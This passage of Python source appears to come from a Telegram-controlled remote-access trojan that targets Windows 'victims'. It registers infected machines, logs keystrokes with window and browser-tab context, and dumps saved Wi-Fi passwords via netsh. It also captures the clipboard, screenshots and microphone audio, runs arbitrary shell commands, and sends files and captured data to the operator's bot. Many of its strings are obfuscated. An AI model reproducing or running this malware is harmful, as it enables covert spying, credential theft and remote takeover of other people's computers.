                    username=self.victim_user,
                    ip=self.victim_ip
                )
                self.clients[hwid] = client
                self.current_client_hwid = hwid
                display_name = client.get_display_name()
                log_debug(decrypt_string("IFcPSy09MAc0A0pKF14PCRpXCg4qa3kZPh4ZSB5YHyUAUxUOM395MT8ZDlEcXkYIC0IXGTp/d0w=").format(display_name=display_name))
                try:
                    display_name = client.get_display_name()
                    loc = "China 🇨🇳 (GFW detected)" if self.get_keyboard_layout() == "cn" else "Global 🌍"
                    
                    # Strictly formatted T1 (actual newlines)
                    msg_template = "📍 Directory: {self.current_working_dir}\n"
                    
                    safe_send_message(self.bot, GLOBAL_CHID, msg_template.format(
                        loc=loc, 
                        pc_name=client.pc_name, 
                        username=client.username, 
                        ip=client.ip, 
                        first_seen=client.first_seen
                    ))
                    log_debug("Start report sent successfully")
                except Exception as e:
                    log_debug(f"Start report failed: {e}")
                return True, client
            else:
                client = self.clients[hwid]
                was_offline = not client.online
                client.update_last_seen()
                client.online = True
                self.current_client_hwid = hwid
                if was_offline:
                    try:
                        display_name = client.get_display_name()
                        # Strictly formatted T2 (actual newlines, /panel at bottom)
                        # Strictly formatted T2 (actual newlines, button for panel)
                        from telebot import types
                        markup = types.InlineKeyboardMarkup()
                        markup.add(types.InlineKeyboardButton("⌨️ Открыть панель управления", callback_data="open_panel"))

                        display_title = display_name # Re-using display_name which might include label
                        
                        text = (
                            f"🚀 <b>КЛИЕНТ ОНЛАЙН (RECONNECTED)</b>\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"👤 <b>ID:</b> <code>{display_title}</code>\n"
                            f"🌐 <b>IP:</b> <code>{client.ip}</code>\n"
                            f"🖥️ <b>Система:</b> <code>Windows 11</code>\n"
                            f"🎤 <b>Микрофон:</b> ✅\n"
                            f"⌚ <b>Время:</b> <code>{client.last_seen}</code>\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                        )
                        
                        safe_send_message(self.bot, GLOBAL_CHID, text, reply_markup=markup)
                    except Exception as e:
                        log_debug(f"Online notification failed: {e}")
                return False, client
    def save_client_state(self):
        with self.client_lock:
            if self.current_client_hwid and self.current_client_hwid in self.clients:
                client = self.clients[self.current_client_hwid]
                client.keylog_buffer = self.keylog_buffer
                client.keylogger_active = self.keylogger_active
                client.clipboard_buffer = self.clipboard_buffer
                client.last_clipboard = self.last_clipboard
                client.current_working_dir = self.current_working_dir
                client.command_history = self.command_history
                client.window_log = self.window_log
                client.cmd_mode_active = self.cmd_mode_active
                client.shell_mode_active = self.shell_mode_active
                client.update_last_seen()
    def get_system_info(self, force=False):
        curr_time = time.time()
        if not force and self._sys_info_cache and (curr_time - self._last_info_time < 60):
            log_debug(decrypt_string("LXM7IwtxESsOTUpfF005CRdBDA4jDjAMPBg="))
            # Update dynamic fields
            self._sys_info_cache['time'] = datetime.now().strftime(decrypt_string("S3pCTgNrfDE="))
            self._sys_info_cache['cwd'] = os.getcwd()
            return self._sys_info_cache

        log_debug(decrypt_string("LXM7IwtxFCsJJFAYFVwSJR1LCx8rPAYLNBEFGFppAwgIXQoGJz8+QjQWHlEEXEkUC0YPBDw6eQE7GwZLWw=="))
        def get_windows_release():
            try:
                ver = platform.version()  
                build = int(ver.split('.')[-1])
                if build >= 22000: return "11"
            except: pass
            return platform.release()
            
        info = {
            'id': self.victim_id,
            'hwid': self.victim_id,  
            'name': self.victim_name,
            'pc': self.victim_pc,
            'user': self.victim_user,
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'version': platform.version(),
            'release': get_windows_release(),
            'arch': platform.architecture()[0],
            'processor': platform.processor(),
            'layout': self.get_keyboard_layout(),
            'cwd': self.current_working_dir,
            'time': datetime.now().strftime(decrypt_string("S2tVTiN8fAZ6UiICV3RcXz0=")),
        }
        
        if hasattr(self, 'system_manager'):
            try:
                # Use native system manager if available
                native_info = self.system_manager.GetSystemInfo()
                if native_info:
                    info['native_data'] = native_info
            except Exception as e:
                log_debug(decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluODcENVcMWRtVAx5UEgMOMw=="))
                
        try:
            info['local_ip'] = socket.gethostbyname(socket.gethostname())
        except:
            info['local_ip'] = 'Unknown'
        try:
            info['external_ip'] = self.victim_ip
        except:
            info['external_ip'] = 'Unknown'
            
        self._sys_info_cache = info
        self._last_info_time = curr_time
        return info
    def get_keyboard_layout(self):
        curr_time = time.time()
        if curr_time - self._last_layout_time < 0.5:
            return self._last_layout
        try:
            user32 = ctypes.windll.user32
            handle = user32.GetForegroundWindow()
            pid = ctypes.wintypes.DWORD()
            thread_id = user32.GetWindowThreadProcessId(handle, ctypes.byref(pid))
            hkl = user32.GetKeyboardLayout(thread_id)
            layout_id = hkl & 0xFFFF
            res = "en"
            if layout_id in [0x0419, 0x419, 1049]:
                res = "ru"
            elif layout_id in [0x0422, 0x422, 1058]:
                res = "ua"
            elif layout_id in [0x0804, 0x0404, 0x0c04, 0x1404, 0x1004]: 
                res = "cn"
            self._last_layout = res
            self._last_layout_time = curr_time
            return res
        except:
            return "en"
    def get_layout_name(self):
        layout = self.get_keyboard_layout()
        if layout == "en": return "EN"
        if layout == "ru": return "RU"
        if layout == "ua": return "UA"
        if layout == "cn": return "CN"
        return "EN"
    def convert_key_advanced(self, key_name, shift_pressed=False, ctrl_pressed=False, alt_pressed=False, caps_pressed=False):
        if len(key_name) != 1:
            return key_name
        self.current_layout = self.get_keyboard_layout()
        is_alt_gr = alt_pressed and not ctrl_pressed
        use_shift = shift_pressed
        if caps_pressed and key_name.isalpha():
            use_shift = not use_shift
        if is_alt_gr and self.current_layout == "ru" and key_name in LAYOUT_RU_ALTGR:
            return LAYOUT_RU_ALTGR[key_name]
        if self.current_layout == "ru":
            if key_name in LAYOUT_RU:
                return LAYOUT_RU_SHIFT[key_name] if use_shift else LAYOUT_RU[key_name]
            if key_name.isdigit() or key_name in decrypt_string('NW9DR2AN'):
                if use_shift:
                    shift_map = {
                        '[': '{', ']': '}', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?', '`': '~',
                        '2': '"', '3': '№', '4': ';', '6': ':', '7': '?'
                    }
                    return shift_map.get(key_name, key_name)
                elif key_name in '/?':
                    return '.'
                return key_name
            for eng, rus in LAYOUT_RU.items():
                if key_name.lower() == eng:
                    return LAYOUT_RU_SHIFT[eng] if use_shift else LAYOUT_RU[eng]
        elif self.current_layout == "ua":
            if key_name in LAYOUT_UA:
                return LAYOUT_UA_SHIFT[key_name] if use_shift else LAYOUT_UA[key_name]
            for eng, ua in LAYOUT_UA.items():
                if key_name.lower() == eng:
                    return LAYOUT_UA_SHIFT[eng] if use_shift else LAYOUT_UA[eng]
        else:
            if use_shift and key_name.isalpha():
                return key_name.upper()
            elif key_name.isalpha():
                return key_name.lower()
            else:
                if use_shift and key_name in LAYOUT_EN_SHIFT:
                    return LAYOUT_EN_SHIFT[key_name]
                return key_name
        return key_name
    def get_wifi(self):
        passwords = []
        try:

            import locale
            encoding = 'cp866' if os.name == 'nt' else 'utf-8'

            result = subprocess.run('netsh wlan show profiles', shell=True, 
                                   capture_output=True, text=False, timeout=5)
            stdout = result.stdout.decode(encoding, errors='ignore')

            for line in stdout.split('\n'):
                if 'All User Profile' in line or 'Все профили пользователей' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        profile = parts[1].strip()
                        cmd = f'netsh wlan show profile name="{profile}" key=clear'
                        output = subprocess.run(cmd, shell=True, capture_output=True, text=False, timeout=3)
                        out_text = output.stdout.decode(encoding, errors='ignore')
                        for out_line in out_text.split('\n'):
                            if 'Key Content' in out_line or 'Содержимое ключа' in out_line:
                                pwd = out_line.split(':')[1].strip()
                                passwords.append(decrypt_string("jLLaSzUhKw08HgZdDwNGAR5FHBY="))
                                break
        except:
            pass
        return passwords
    def take_screenshot(self):
        try:
            sys_mod = getattr(self, 'system_manager', None)
            if not sys_mod:
                log_debug("❌ [take_screenshot] system_manager not found")
                return None
            
            img_bytes = sys_mod.TakeScreenshot()
            if img_bytes is None:
                log_debug("❌ [take_screenshot] TakeScreenshot() returned None")
                return None
            
            # Fallback for temp_dir
            target_dir = getattr(self, 'temp_dir', os.environ.get('TEMP', '.'))
            path = os.path.join(target_dir, decrypt_string("HVEKDis/dwgqEA=="))
            
            with open(path, "wb") as f:
                f.write(img_bytes)
            
            log_debug(decrypt_string("jK79SxUlOAk/KBlbAFwDFB1aFx8TcQoXORQPSwEDRgEeUwwDM3FxGTYSBBAbVAElDEsMDj14JEI4Dh5dARA="))
            return path
        except Exception as e:
            log_debug(decrypt_string("jK/0SxUlOAk/KBlbAFwDFB1aFx8TcRwaORIaTBtWCEBOSR0W"))
            import traceback
            log_debug(traceback.format_exc())
            return None


    def record_screen(self, duration, output_path):
        """Запись экрана временно отключена (GIF требует PIL)"""
        return "❌ Запись экрана временно недоступна (требуется PIL)"
    def get_window_info_detailed(self):
        try:
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            handle = user32.GetForegroundWindow()
            pid = wintypes.DWORD()
            user32.GetWindowThreadProcessId(handle, ctypes.byref(pid))
            length = user32.GetWindowTextLengthW(handle)
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(handle, buff, length + 1)
            window_title = buff.value
            process_name = "Unknown"
            try:
                psutil = __import__('ps' + 'util')
                process = psutil.Process(pid.value)
                process_name = process.name()
            except:
                pass
            browser_name = None
            tab_title = window_title
            game_name = None
            browsers = {
                'chrome.exe': 'Chrome',
                'msedge.exe': 'Edge',
                'firefox.exe': 'Firefox',
                'opera.exe': 'Opera',
                'brave.exe': 'Brave',
                'yandex.exe': 'Яндекс',
            }
            games = {
                'steam.exe': 'Steam',
                'epicgameslauncher.exe': 'Epic Games',
                'battlenet.exe': 'Battle.net',
                'discord.exe': 'Discord',
                'origin.exe': 'Origin',
            }
            for exe, name in browsers.items():
                if process_name.lower() == exe or exe in process_name.lower():
                    browser_name = name
                    for separator in [' - ', ' — ', ' | ', '•']:
                        if separator in window_title:
                            parts = window_title.split(separator)
                            if len(parts) > 1:
                                if name.lower() in parts[-1].lower() or 'browser' in parts[-1].lower():
                                    tab_title = separator.join(parts[:-1])
                                elif name.lower() in parts[0].lower() or 'browser' in parts[0].lower():
                                    tab_title = separator.join(parts[1:])
                                else:
                                    tab_title = parts[0]
                            break
                    break
            for exe, name in games.items():
                if process_name.lower() == exe or exe in process_name.lower():
                    game_name = name
                    break
            return {
                'title': window_title,
                'process_name': process_name,
                'browser': browser_name,
                'tab': tab_title if browser_name else None,
                'game': game_name,
                'timestamp': datetime.now().strftime(decrypt_string("S3pCTgNrfDE=")),
                'layout': self.get_layout_name()
            }
        except:
            return {
                'title': "Unknown",
                'process_name': "Unknown",
                'timestamp': datetime.now().strftime(decrypt_string("S3pCTgNrfDE=")),
                'layout': self.get_layout_name()
            }
    def finalize_current_line(self):
        if self.keylog_current_line and len(self.keylog_current_line.strip()) > 0:
            timestamp = datetime.now().strftime(decrypt_string("S3pCTgNrfDE="))
            window_info = self.get_window_info_detailed()
            current_app = window_info['game'] or window_info['browser'] or window_info['process_name']
            if window_info.get('tab'):
                tab_text = str(window_info['tab'])
                current_app += decrypt_string("ThoDHy8zBhY/Dx5jSAtWJxMb")
            context_prefix = ""
            if not self.last_context_app or self.last_context_app != current_app:
                context_prefix = f"[{current_app}] "
                self.last_context_app = str(current_app)
            context_entry = decrypt_string("FVEXBTo0IRYFBxhdFFAeBxVGEQYrIi0DNwcXGAlKAxYIHBMONz02BQUUH0oAXAgOMV4RBSss")
            self.keylog_context.append(context_entry)
            self.keylog_full_history.append(context_entry)
            self.keylog_current_line = ""
            self.keylog_word_buffer = ""
    def start_keylogger(self):
        if not KEYBOARD_AVAILABLE:
            safe_send_message(self.bot, GLOBAL_CHID, "❌ Keyboard library not available")
            return
        if self.keylogger_active:
            safe_send_message(self.bot, GLOBAL_CHID, "⌨️ Keylogger already running")
            return
        def on_key(event):
            try:
                if not self.keylogger_active:
                    return
                current_time = time.time()
                key = event.name
                shift_pressed = False
                ctrl_pressed = False
                alt_pressed = False
                caps_pressed = False
                try:
                    shift_pressed = keyboard.is_pressed('shift')
                    ctrl_pressed = keyboard.is_pressed('ctrl')
                    alt_pressed = keyboard.is_pressed('alt')
                    caps_pressed = keyboard.is_pressed('caps lock')
                except:
                    pass
                window_info = self.get_window_info_detailed()
                if window_info['title'] != self.last_window_title:
                    if self.keylog_current_line:
                        self.finalize_current_line()
                        self.last_context_app = ""
                    window_marker = f"\n\n📌 <b>[{window_info['timestamp']}]</b>\n"
                    if window_info['game']:
                        window_marker += f"🎮 <b>{window_info['game']}</b> | "
                    elif window_info['browser']:
                        window_marker += f"🌐 <b>{window_info['browser']}</b>"
                        if window_info['tab']:
                            window_marker += f" | {window_info['tab']}"
                    else:
                        window_marker += f"💻 <b>{window_info['process_name']}</b>"
                    
                    window_marker += f"\n🏷️ {window_info['title'][:100]}"
                    window_marker += f"\n🗺️ Layout: {window_info['layout']}\n"
                    self.keylog_buffer += window_marker
                    self.last_window_title = str(window_info['title'])
                    self.last_window_time = current_time
                if key == 'backspace':
                    if self.keylog_current_line:
                        self.keylog_current_line = self.keylog_current_line[:-1]
                        if self.keylog_buffer and not self.keylog_buffer.endswith('\n'):
                            self.keylog_buffer = self.keylog_buffer[:-1]
                    self.last_key_time = current_time
                    return
                if key == 'enter':
                    self.finalize_current_line()
                    self.keylog_buffer += '\n'
                    self.last_key_time = current_time
                    return
                if key == 'space':
                    self.keylog_buffer += ' '
                    self.keylog_current_line += ' '
                    self.last_key_time = current_time
                    return
                if key in ['tab', 'shift', 'ctrl', 'alt', 'alt gr', 'right alt', 'menu', 
                           'caps lock', 'num lock', 'scroll lock', 'insert', 'delete', 
                           'page up', 'page down', 'home', 'end', 'left', 'right', 'up', 'down',
                           'esc', 'windows', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']:
                    return
                if len(key) == 1:
                    if ctrl_pressed:
                        return
                    converted_key = self.convert_key_advanced(
                        key, shift_pressed, ctrl_pressed, alt_pressed, caps_pressed
                    )
                    self.keylog_buffer += converted_key
                    self.keylog_current_line += converted_key
                    self.last_key_time = current_time
                if len(self.keylog_buffer) >= 1000:
                    self.send_advanced_keylog()
                if current_time - self.last_key_time > 15 and self.keylog_current_line:
                    self.finalize_current_line()
            except Exception as e:
                print(decrypt_string("NRMlSwU0IA41EA1dABkDCBxdClFuKjwf"))
        try:
            self.keyboard_hook = keyboard.on_release(on_key)
            self.keylogger_active = True
            self.keylog_context.clear()
            self.keylog_full_history.clear()
            self.keylog_current_line = ""
            self.last_context_app = ""
            print("[+] Smart keylogger started")
            safe_send_message(
                self.bot,
                GLOBAL_CHID,
                f"⌨️ <b>Smart Keylogger Active</b>\n"
                f"💻 <b>PC:</b> <code>{self.victim_pc}</code>\n"
                f"👤 <b>User:</b> <code>{self.victim_user}</code>\n"
                f"✅ Focused Context Recording",
                parse_mode="HTML"
            )
        except Exception as e:
            print(decrypt_string("NRMlSwgwMA4/E0pMHRkVDg9ADEslNCAONRANXQADRgELTw=="))
            safe_send_message(
                self.bot,
                ADMIN_ID,
                decrypt_string("jK/0SwgwMA4/E0pMHRkVDg9ADEslNCAONRANXQBlCAEdRgpDK3gCWGtHWmUP")
            )
    def stop_keylogger(self):
        if not self.keylogger_active:
            safe_send_message(self.bot, ADMIN_ID, "⌨️ Keylogger not running")
            return
        if self.keylog_current_line:
            self.finalize_current_line()
        if self.keylog_buffer or self.keylog_context:
            self.send_advanced_keylog(full_log=True)
        try:
            if hasattr(self, 'keyboard_hook') and self.keyboard_hook:
                keyboard.unhook(self.keyboard_hook)
        except:
            pass
        self.keylogger_active = False
        print("[+] Keylogger stopped")
        safe_send_message(
            self.bot,
            ADMIN_ID,
            decrypt_string("jL7QhPbeebLAp9/oy+ndqtDiy7v9geyz2le6hqO4t/i+gqjWnu+J0IrMuo2ihGyK8aHyS57DiOOKwrqLoodGq+/ixrv/gNmy6qfX6MwZt/u+iqjXnuOJ3IrMuoaii1xaFVEXHiAlJA==").format(count=len(self.keylog_buffer))
        )
    def get_formatted_keylog(self, full_log=False):
        layout = self.get_layout_name()
        if full_log:
            formatted = decrypt_string("nq3r4G6BxrLEp/Ho7+nNqvcSqPCez4nxeqfw6Onp9qr84uC73oH7svmnyujZZQg=")
            formatted += decrypt_string("nq3uzqHp1kIhBA9UFBcQEw1GEQYRPzgPPwo2Vg==")
            formatted += decrypt_string("nq3r4W6By7Pbp9/owenYWr+zqNOe7YnQism6g6KHtshUEgMHKz9xET8bDBYZXB8WAVUnCTs3PwcoXhdkHA==")
            formatted += decrypt_string("nq3r9m6B+LPYpurozOncWr6AWLv2gNiz2KfU6fLp3qrWCFgQIjQ3SikSBl5cUgMDAl0fNCgkNQ4FHwNLBlYUA0dPJAU=")
            formatted += decrypt_string("nq3v0aHp1kKK1bqNooO3+b+7qNuf3nmz2qfa6fPp3KrV4si7+oHjsupNSkMeWB8VG0YFNyA=")
            formatted += decrypt_string("nq3t+24qPQMuEh5RH1xIFAFFUEJgIi0QPAMDVRcRQV8mCF0mdHQKRXMKNlYuVw==")
            if self.keylog_full_history:
                formatted += decrypt_string("nq3r926BwbPbpujozOjmqtbj90ue44nQism6jKKJXCYA")
                history_list = list(self.keylog_full_history)
                for entry in history_list[-30:]:
                    formatted += decrypt_string("ThIDDiAlKxsnKwQ=")
                formatted += "\n"
            if self.keylog_buffer:
                formatted += decrypt_string("nq3rzW6B+LPRpurozOnfWr6Dqeif1YnXi/dQZBw=")
                if self.keylog_buffer:
                    formatted += self.keylog_buffer[-3000:] if len(self.keylog_buffer) > 3000 else self.keylog_buffer
                formatted += "\n"
            return formatted
        else:
            return f"""⌨️ КЕЙЛОГГЕР | 🗺️ {layout}
🖥️ {self.victim_name}
📊 В буфере: {len(self.keylog_buffer)} | 📝 В контексте: {len(self.keylog_context)}
📜 Последние строки:
{chr(10).join(['  ' + e for e in self.keylog_context[-5:]]) if self.keylog_context else '  (пусто)'}
✏️ Текущий ввод:
{self.keylog_current_line if self.keylog_current_line else '(пусто)'}
"""
    def send_advanced_keylog(self, full_log=False):
        if (not self.keylog_buffer and not self.keylog_context) or not TELEGRAM_AVAILABLE:
            return
        try:
            self.save_client_state()
            log_message = self.get_formatted_keylog(full_log)
            if len(log_message) > 4000:
                parts: List[str] = [log_message[i:i+4000] for i in range(0, len(log_message), 4000)]
                for i, part in enumerate(parts[:3]):
                    if i == 0:
                        safe_send_message(self.bot, ADMIN_ID, part)
                    else:
                        safe_send_message(self.bot, ADMIN_ID, decrypt_string("nq3r5W6BxrPap9ToxunYqtXizrv7geSy4qffFlwXOhQyXAMbLyMtHw=="))
            else:
                safe_send_message(self.bot, ADMIN_ID, log_message)
            if not full_log:
                self.keylog_buffer = ""
                if len(self.keylog_context) > 10:
                    self.keylog_context = deque(list(self.keylog_context)[-10:], maxlen=50)
        except Exception as e:
            print(decrypt_string("NRMlSx00NwZ6HA9BHlYBWgtACgQ8a3kZPwo="))
    def get_keylog_stats(self):
        if not self.keylogger_active:
            return "⌨️ Кейлоггер не активен"
        stats = decrypt_string("nq3r4W6B+LPYp9rp8Oneq+/j+rv2geOy6le6gqKMtsO+iajVnuKJ0YrCu7iiiToU")
        stats += decrypt_string("nq3uzqHp1kIhBA9UFBcQEw1GEQYRPzgPPwo2Vg==")
        stats += decrypt_string("nq3rzW6B+LLip9bowOnYqtXixrv8cYnQeqfb6fHo4qrb4/i7+2t5GTYSBBABXAocQFkdEiI+Pj04AgxeF0tPBzJc")
        stats += decrypt_string("jK73hPbeebL4p9/oyOjlq+fiyLrBcYjji/W7uKKHtsC+gkJLNT08DHIED1QUFw0fF14XDBEyLBAoEgRMLVUPFAsbBUuf0Inaisu6iqKHtsG+jKjZEj8=")
        stats += decrypt_string("nq3r9m6BzrLqp9XoyujnqtviwUue43my4KfU6M/o5Krb4sK6z4Dbsu9NSkMeXAhSHVcUDWA6PBs2GA1nEVYIDgtKDEIzDTc=")
        stats += decrypt_string("nq3r926By7Pbp9/owenYWr6AWLv2gNiz2KfU6fLp3qrWCFgQIjQ3SikSBl5cUgMDAl0fNCgkNQ4FHwNLBlYUA0dPJAU=")
        stats += decrypt_string("jL7QhPbeebLHp9roxOnWq+ziwLv3cYjjeqfV6Mzo56rV4s27+oHksu+n0xiih7f4vo2p657hidCKzbqASBkdCQteHkUlNCA9KgUPSwFmBRUbXAwWEj8FDA==")
        window_info = self.get_window_info_detailed()
        stats += decrypt_string("nq3S9G6B+7Lvp9Dp8ejvqtvizUue74nYisq6hkhlCA==")
        stats += decrypt_string("ThKI9N3deRktHgRcHU45EwBUFzBpJTAWNhJNZSkDV09ebwU3IA==")
        stats += decrypt_string("ThKI9N3QeRktHgRcHU45EwBUFzBpISsNORIZSy1XBxcLFSUWEj8=")
        if window_info['browser']:
            stats += decrypt_string("ThKI9MLBeRktHgRcHU45EwBUFzBpMysNLQQPSlVkGyYA")
            if window_info['tab']:
                stats += decrypt_string("ThKI9NrHeRktHgRcHU45EwBUFzBpJTgAfSoxAkMMVicTbhY=")
        if window_info['game']:
            stats += decrypt_string("ThKI9MD/eRktHgRcHU45EwBUFzBpNjgPP1A3RS5X")
        return stats
    def clear_keylog(self):
        try:
            self.keylog_buffer = ""
        except:
            pass 
        self.keylog_context = []
        self.keylog_current_line = ""
        self.keylog_full_history = []
        self.key_press_count = 0
        safe_send_message(self.bot, GLOBAL_CHID, "🧹 Кейлоггер очищен")
    def start_clipboard_logger(self):
        def check_clipboard():
            while self.is_running:
                try:
                    win32clipboard.OpenClipboard()
                    try:
                        data = win32clipboard.GetClipboardData()
                        text = str(data)
                        if text and text != self.last_clipboard and len(text) > 10:
                            self.last_clipboard = text
                            self.clipboard_buffer.append({
                                'time': datetime.now().strftime(decrypt_string("S3pCTgNrfDE=")),
                                'text': text[:500]
                            })
                            if len(self.clipboard_buffer) >= 3:
                                self.send_clipboard()
                    except:
                        pass
                    win32clipboard.CloseClipboard()
                except:
                    pass
                time.sleep(3)
        self.thread_manager.start_daemon(target=check_clipboard, name="ClipboardMonitor")
    def send_clipboard(self):
        if not self.clipboard_buffer or not TELEGRAM_AVAILABLE:
            return
        try:
            self.save_client_state()
            client_name = self.victim_name
            message = f"📋 <b>Clipboard Monitor</b>\n🖥️ <code>{client_name}</code>\n\n"
            temp_clip = list(self.clipboard_buffer)
            for i, item in enumerate(temp_clip[-5:]): 
                message += f"🔹 <b>{i+1}.</b> <i>[{item['time']}]</i>\n<code>{item['text']}</code>\n\n"
            safe_send_message(self.bot, GLOBAL_CHID, message[:4000], parse_mode='HTML')
            self.clipboard_buffer = []
        except:
            pass
    def check_active_window(self):
        current = self.window_tracker.get_window_info()
        if not self.last_window or self.last_window.get('title') != current.get('title'):
            self.window_log.append(current)
            if len(self.window_log) > 50:
                temp_win = list(self.window_log)
                self.window_log = temp_win[-50:]
        self.last_window = current
        return current
    def record_microphone(self, duration=5):
        try:
            if AUDIO_AVAILABLE and self.check_microphone_availability():
                return Microphone.record_audio(duration)
        except:
            pass
        return None
    def check_microphone_availability(self):
        try:
            if AUDIO_AVAILABLE:
                return Microphone.check_availability()
        except:
            pass
        return False
    def run_cmd(self, command):
        try:
            self.command_history.append(command)
            if len(self.command_history) > 20:
                temp_hist = list(self.command_history)
                self.command_history = temp_hist[-20:] 
            if command.strip().lower().startswith('cd '):
                new_path = command.strip()[3:].strip()
                try:
                    old_path = self.current_working_dir
                    if new_path == '..':
                        self.current_working_dir = os.path.dirname(self.current_working_dir)
                        return f"📂 <b>Директория изменена</b>\n━━━━━━━━━━━━━━━━━━\n🚚 <code>{old_path}</code>\n⬇️\n📍 <code>{self.current_working_dir}</code>"
                    elif new_path == '~' or new_path == 'home':
                        self.current_working_dir = os.path.expanduser('~')
                        return f"🏠 <b>Переход в домашнюю директорию</b>\n📍 <code>{self.current_working_dir}</code>"
                    elif new_path == '' or new_path == '.':
                        return decrypt_string("nq3r5m4SLBAoEgRMUl0PCAtRDAQ8KGM+NAwZXR5fSBkbQAoOICUGFTUFAVEcXjkeB0AF")
                    else:
                        if os.path.isabs(new_path):
                            potential_path = new_path
                        else:
                            potential_path = os.path.join(self.current_working_dir, new_path)
                        potential_path = os.path.normpath(potential_path)
                        if os.path.exists(potential_path) and os.path.isdir(potential_path):
                            self.current_working_dir = potential_path
                            return f"📂 <b>Директория изменена</b>\n📍 <code>{self.current_working_dir}</code>"
                        else:
                            return decrypt_string("jK/0Swo4Kwc5AwVKCxkIFRoSHgQ7Pz1YegwEXQVmFhsaWgU3IKHG8ddXKU0ASwMUGghYED00NQR0FB9KAFwIDjFFFxklODcFBRMDSg8=")
                except Exception as e:
                    return decrypt_string("jK/0Sy01eQcoBQVKSBkdCRpAUA5nCmNTakc3RS5XluX9v1goOyMrBzQDUBgJSgMWCBwbHjwjPAwuKB1XAFIPFAltHAI8LA==")
            if command.strip().lower() == 'cd':
                return decrypt_string("nq3r5m4SLBAoEgRMUl0PCAtRDAQ8KGM+NAwZXR5fSBkbQAoOICUGFTUFAVEcXjkeB0AF")
            if command.strip().lower() == 'pwd':
                return decrypt_string("nq3r6m4SLBAoEgRMUl0PCAtRDAQ8KGM+NAwZXR5fSBkbQAoOICUGFTUFAVEcXjkeB0AF")
            if command.strip().lower() in ['ls', 'dir']:
                try:
                    items = []
                    folders_count = 0
                    files_count = 0
                    all_items = os.listdir(self.current_working_dir)
                    for item in all_items[:50]:
                        item_path = os.path.join(self.current_working_dir, item)
                        if os.path.isdir(item_path):
                            items.append(f"📁 {item}")
                            folders_count += 1
                        else:
                            size = os.path.getsize(item_path)
                            if size < 1024:
                                size_str = f"{size} B"
                            elif size < 1048576:
                                size_str = decrypt_string("FUERESt+aFJoQ1AWQ18bWiVw")
                            else:
                                size_str = decrypt_string("FUERESt+aFJuT18PRANISwhPWCYM")
                            items.append(f"📄 {item} ({size_str})")
                            files_count += 1
                    result = f"📂 <b>Содержимое:</b> <code>{self.current_working_dir}</code>\n"
                    result += f"📊 <b>Папок:</b> {folders_count} | <b>Файлов:</b> {files_count}\n━━━━━━━━━━━━━━━━━━\n"
                    items_list = list(items)
                    result += "\n".join(items_list[:30])
                    if len(items) > 30:
                        result += f"\n\n🔹 ... и ещё {len(items)-30} элементов"
                    return result
                except PermissionError:
                    return decrypt_string("jK/0Sx40Kw8zBBlRHVdGHgtcEQ4qa3kZKRIGXlxaEwgcVxYfESY2EDEeBF8tXQ8IEw==")
                except Exception as e:
                    return decrypt_string("jK/0SwsjKw0oVwZRAU0PFAkSHAI8NDoWNQUTAlJCFQ4cGh1CFWtoUmoqFw==")
            # Premium Native Execution (PPID Spoofed)
            if hasattr(self, 'shell_manager'):
                output = self.shell_manager.ExecuteCommand(command)
                if not output or output.strip() == "":
                    output = "✅ Command executed (No output)"
            else:
                # Fallback to subprocess if DLL fails
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True,
                    timeout=30, encoding='cp866', errors='ignore', cwd=self.current_working_dir
                )
                output = result.stdout if result.stdout else result.stderr
                if not output:
                    output = "✅ Success" if result.returncode == 0 else "❌ Failure"

            if len(output) > 3500:
                output = output[:3500] + decrypt_string("MlxWRWBxAhYoAgRbE00DHjM=")
            
            if command.strip().lower() not in ['ls', 'dir', 'cd', 'pwd']:
                return f"📍 <code>{self.current_working_dir}</code>\n<code>> {command}</code>\n\n{output}"
            return output
        except Exception as e:
            return decrypt_string("jK/0S3IzZyciEglNBlAJFE53ChkhI2NedRVUGAlKEghGV1EwdGBsUgcK")
            return decrypt_string("jK/0SwsjKw0oTUpDAU0UUgsbI1F/YWk/Jw==")
    def send_file(self, file_path, chat_id):
        try:
            if not os.path.exists(file_path):
                return "❌ Файл не найден"
            if not os.path.isfile(file_path):
                return "❌ Указанный путь не является файлом"
            file_size = os.path.getsize(file_path)
            max_size = 50 * 1024 * 1024
            if file_size > max_size:
                size_mb = file_size / (1024 * 1024)
                try:
                    from core.cloud import CloudModule
                    link = CloudModule.upload_file(file_path)
                    if link:
                        return decrypt_string("jKr5hPbeebL+p9roy+ndWr6FqNue4ojii/S6jqKMtsdO4spLnu+J04rMuoiig7bEThoDGCcrPD03FVAWQ18bWiNwUVESPyIOMxkBRQ==")
                except:
                    pass
                return decrypt_string("jK/0S571idKKzrqDUujnqtXiwLrGgeOy5KfWGKKItsS+iannn9mJ3IrOUBgJSg8AC20VCXR/aAQnVyd6Lle25r6CqNGf0Inaisu7u6KFXFpbAlgmDA==")
            file_name = os.path.basename(file_path)
            file_ext = os.path.splitext(file_name)[1].lower()
            file_icon = self.get_file_icon(file_ext)
            size_kb = file_size / 1024
            if size_kb < 1024:
                size_str = decrypt_string("FUERESsOMgBgWVteDxktOA==")
            else:
                size_mb = size_kb / 1024
                size_str = decrypt_string("FUERESsONABgWVteDxkrOA==")
            modified_time = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime(decrypt_string("S2tVTiN8fAZ6UiICV3RcXz0="))
            self.save_client_state()
            client_name = self.victim_name
            caption = f"""{file_icon} Файл отправлен
🖥️ {client_name}
📁 Имя: {file_name}
📦 Размер: {size_str}
🕐 Изменен: {modified_time}
📍 Путь: {file_path[:100]}
✅ Успешно загружен!
"""
            with open(file_path, 'rb') as f:
                self.bot.send_document(
                    chat_id, 
                    f, 
                    caption=caption[:1024],
                    visible_file_name=file_name
                )
            return f"✅ Файл '{file_name}' отправлен успешно"
        except Exception as e:
            return decrypt_string("jK/0S57PiOqKz7qJooO2yk7ixrrMgeaz2qfa6MDp3KrWCFgQPSUrSj9eMQJDCVYnEw==")
    def get_file_icon(self, extension):
        icons = {
